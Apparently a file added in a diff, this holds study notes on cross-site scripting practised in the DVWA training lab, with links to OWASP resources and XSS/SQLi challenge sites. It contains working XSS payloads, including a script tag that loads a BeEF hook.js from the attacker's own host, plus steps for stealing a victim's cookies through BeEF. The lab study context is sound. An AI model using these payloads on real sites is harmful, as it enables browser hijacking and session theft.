@@ -1,0 +1,97 @@
+#DVWA in Gameover
+
+#BEEF tool
+
+#http://hack.me
+
+#https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+#https://www.owasp.org/index.php/DOM_Based_XSS
+
+#https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29
+
+#https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet
+
+#https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet
+
+XSS challenges
+
+#http://xss-quiz.int21h.jp/
+#https://xss-game.appspot.com/
+#https://escape.alf.nu/
+#https://hack.me/t/XSS
+#http://leettime.net/xsslab1/
+#http://phizo.altervista.org/
+
+SQLi Challenges
+
+#http://www.zixem.altervista.or...
+#https://hack.me/t/SQLi
+#http://root0x00.altervista.org...
+#http://www.legendaryhatman.alt...
+#http://leettime.net/sql-inject...
+#http://www.arjun.altervista.or...
+#http://zerocoolhf.altervista.o...
+#http://peternguyen.altervista....
+#http://sqlidemo.altervista.org...
+#http://nurfed.altervista.org/
+
+
+Earlier Cross Site Scripting was known as Script Injection. In this attack we are going to insert the malicious scripts that is executed by the browser, thus its known as client side attack. Found by Georgi Guninski in 1999, while woeking on finding flaws in IE Security model. David Ross(MS) published the first paper on XSS flaws entitled "Script Injection." Types of XSS are : Stored,Reflected,DOM etc.,
+
+
+eg: In DVWA, XSS Reflected --> Textbox --> <script>alert("Hacked");</script>
+
+                                                    (or)
+
+                                           <script>alert(document.cookie);</script>
+
+
+
+                      Reflected means one time attack. When coming back to same page the script doesnt exists/execute. i.e, temporary.
+
+
+eg 1: In DVWA, XSS Stored --> Textbox --> <script>alert("You have been hacked");</script>
+
+
+                 Stored means the malicious script in stored permanently. Is executed whenever the page is visited.
+
+
+
+Tools:
+
+Beef - Browser Exploitation Framework
+
+    hook.js --> inbuilt malicious script in beef to use for browser exploitation.
+
+ eg 2: In DVWA, XSS Stored --> Textbox --> <script src="http://"your ip":3000/hook.js>CLICK HERE</script>
+
+              if script is read, then it will be shown in the BEEF control panel under Online Browsers.
+
+                     Click on the IP/target-ip to get information about the browser under "Details Tab " of BEEF.
+
+              Go to "Commands Tab" --> Use command from "Module Tree" Panel --> Select "Browsers Folder" then command to be used., for eg: "Get Cookie", thus giving the cookie values of the target.
+
+
+#http://resources.infosecinstitute.com/beef-part-1/
+
+#http://resources.infosecinstitute.com/beef-part-2/
+
+#https://github.com/beefproject/beef/wiki/BeEF-modules
+
+
+#http://2012.zeronights.org/includes/docs/Antisnatchor%20-%20All%20you%20ever%20wanted%20to%20know%20about%20BEEF.pdf
+
+#http://www.tenable.com/sites/drupal.dmz.tenablesecurity.com/files/uploads/documents/whitepapers/nesssus-web-based-auditing_0.pdf
+
+
+
+
+                     
+
+
+
+
+
+
+
